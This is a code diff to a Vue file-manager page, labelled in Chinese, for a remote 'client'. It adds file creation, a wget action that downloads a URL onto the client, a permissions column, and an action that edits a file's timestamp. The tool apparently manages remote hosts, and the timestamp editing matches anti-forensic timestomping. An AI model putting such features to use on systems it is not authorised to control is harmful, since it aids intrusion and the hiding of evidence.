@@ -32,6 +32,7 @@ function ctxAction(key: string) {
   else if (key === 'download') download(row)
   else if (key === 'rename') rename(row)
   else if (key === 'delete') remove(row)
+  else if (key === 'time') modifyTime(row)
   else if (key === 'copy') copyPath(row)
 }
 
@@ -43,7 +44,8 @@ const uploadRef = ref<HTMLInputElement>()
 const columns = [
   { title: '文件名', dataIndex: 'name', width: 300 },
   { title: '大小', dataIndex: 'size', width: 110 },
-  { title: '修改时间', dataIndex: 'time', width: 220 },
+  { title: '修改时间', dataIndex: 'time', width: 200 },
+  { title: '权限', dataIndex: 'mode', width: 110 },
   { title: '操作', key: 'action', width: 240 },
 ]
 
@@ -188,6 +190,60 @@ async function openFile(r: any) {
   editor.value = true
 }
 
+// 新建文件（4.9.3 工具栏「新建文件」，label 文件名）
+async function touchFile() {
+  let name = ''
+  Modal.confirm({
+    title: '新建文件',
+    content: () => h('input', {
+      class: 'ant-input', style: 'width:100%',
+      onInput: (e: Event) => { name = (e.target as HTMLInputElement).value },
+    }),
+    onOk: async () => {
+      if (!name) return
+      await post('/file/touch', { id, path: fullPath({ name }) })
+      message.success('文件名新建成功 ' + name)
+      load()
+    },
+  })
+}
+
+// Wget 下载文件（4.9.3 工具栏「Wget下载文件」，label 下载链接）
+async function wgetFile() {
+  let url = ''
+  Modal.confirm({
+    title: 'Wget下载文件',
+    content: () => h('input', {
+      class: 'ant-input', style: 'width:100%', placeholder: 'https://example.com/a.txt',
+      onInput: (e: Event) => { url = (e.target as HTMLInputElement).value },
+    }),
+    onOk: async () => {
+      if (!url) return
+      await post('/file/wget', { id, path: path.value, target: url })
+      message.success('下载文件成功')
+      load()
+    },
+  })
+}
+
+// 修改文件时间（4.9.3 行内操作「修改时间」）
+async function modifyTime(row: any) {
+  let t = ''
+  Modal.confirm({
+    title: '修改文件时间',
+    content: () => h('input', {
+      class: 'ant-input', style: 'width:100%', placeholder: '2020-01-01 00:00:00',
+      onInput: (e: Event) => { t = (e.target as HTMLInputElement).value },
+    }),
+    onOk: async () => {
+      if (!t) return
+      await post('/file/modifytime', { id, path: path.value, target: nameOf(row), time: t })
+      message.success('文件时间修改成功')
+      load()
+    },
+  })
+}
+
 async function saveFile() {
   await post('/file/edit', { id, path: editPath.value, content: editContent.value })
   message.success('已保存')
@@ -261,6 +317,8 @@ async function onUpload(e: Event) {
       <a-button @click="load(path)">打开</a-button>
       <a-button @click="up">上级</a-button>
       <a-button @click="mkdir">新建文件夹</a-button>
+      <a-button @click="touchFile">新建文件</a-button>
+      <a-button @click="wgetFile">Wget下载文件</a-button>
       <a-button @click="uploadRef?.click()">上传插件</a-button>
       <input ref="uploadRef" type="file" style="display:none" @change="onUpload" />
       <span class="hint mono">客户端 #{{ id }}</span>
@@ -312,6 +370,7 @@ async function onUpload(e: Event) {
           <a-menu-item key="open">{{ ctxRow && isDir(ctxRow) ? '进入目录' : '编辑' }}</a-menu-item>
           <a-menu-item v-if="ctxRow && !isDir(ctxRow)" key="download">下载</a-menu-item>
           <a-menu-item key="rename">重命名</a-menu-item>
+          <a-menu-item key="time">修改时间</a-menu-item>
           <a-menu-item key="copy">拷贝路径</a-menu-item>
           <a-menu-divider />
           <a-menu-item key="delete" danger>删除文件</a-menu-item>
